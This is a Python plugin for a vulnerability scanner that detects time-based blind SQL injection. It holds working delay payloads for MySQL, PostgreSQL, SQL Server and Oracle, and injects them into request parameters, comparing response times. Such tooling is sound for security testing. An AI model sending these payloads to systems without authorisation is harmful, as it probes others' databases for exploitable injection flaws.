#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Evi1ran November 17, 2020
# JiuZero 2025/3/4

import time, config
from api import generateResponse, random_num, PLACE, VulType, Type, KB, PluginBase, conf


class Z0SCAN(PluginBase):
    name = 'SQLiTime'
    desc = "Delay Time SQLi Injection"
    
    sleep_time = config.SQLi_TIME
    sleep_str = "[SLEEP_TIME]"
    verify_count = 2

    def generatePayloads(self, payloadTemplate):
        payload1 = payloadTemplate.replace(self.sleep_str, str(self.sleep_time))
        payload0 = payloadTemplate.replace(self.sleep_str, "0")

        return payload1, payload0

    def condition(self):
        if not KB["WAFSTATE"] and 1 in conf.level:
            return True
        return False
        
    def audit(self):
        if self.condition():
            num = random_num(4)
            sql_times = {
                "MySQL": (
                    " AND SLEEP({})".format(self.sleep_str),
                    " AND SLEEP({})--+".format(self.sleep_str),
                    "' AND SLEEP({})".format(self.sleep_str),
                    "' AND SLEEP({})--+".format(self.sleep_str),
                    "' AND SLEEP({}) AND '{}'='{}".format(self.sleep_str, num, num),
                    '''" AND SLEEP({}) AND "{}"="{}'''.format(self.sleep_str, num, num)),
                "Postgresql": (
                    "AND {}=(SELECT {} FROM PG_SLEEP({}))".format(num, num, self.sleep_str),
                    "AND {}=(SELECT {} FROM PG_SLEEP({}))--+".format(num, num, self.sleep_str),
                ),
                "Microsoft SQL Server or Sybase": (
                    " waitfor delay '0:0:{}'--+".format(self.sleep_str),
                    "' waitfor delay '0:0:{}'--+".format(self.sleep_str),
                    '''" waitfor delay '0:0:{}'--+'''.format(self.sleep_str)),
                "Oracle": (
                    " and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+".format(self.sleep_str),
                    "' and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+".format(self.sleep_str),
                    '''"  and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+'''.format(self.sleep_str),
                    "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})".format(self.sleep_str),
                    "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})--+".format(self.sleep_str),
                )
            }
            iterdatas = self.generateItemdatas()
    
            # 为了避免参数1的时间延迟干扰到参数2的检验，不做参数多线程
            for _ in iterdatas:
                k, v, position = _
                for dbms_type, _payloads in sql_times.items():
                    for payloadTemplate in _payloads:
                        r1 = r0 = None
                        delta = 0
                        flag = 0
                        p1, p0 = self.generatePayloads(payloadTemplate)
                        payload1 = self.insertPayload(k, v, position, p1)
                        payload0 = self.insertPayload(k, v, position, p0)
                        for i in range(self.verify_count):
                            start_time = time.perf_counter()
                            r1 = self.req(position, payload1)
                            if not r1:
                                continue
                            end_time_1 = time.perf_counter()
                            delta1 = end_time_1 - start_time
                            if delta1 > self.sleep_time:
                                r0 = self.req(position, payload0)
                                end_time_0 = time.perf_counter()
                                delta0 = end_time_0 - end_time_1
                                if delta1 > delta0 > 0:
                                    flag += 1
                                    delta = round(delta1 - delta0, 3)
                                    continue
                            break
    
                        if r1 is not None and flag == self.verify_count:
                            result = self.new_result()
                            result.init_info(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.SQLI, position, param=k, payload=payload1, msg="Dbms Maybe {}; Delay for {}s".format(dbms_type, delta))
                            result.add_detail("Request", r1.reqinfo, generateResponse(r1), "Dbms Maybe {}; Delay for {}s".format(dbms_type, delta))
                            self.success(result)
                            return True
    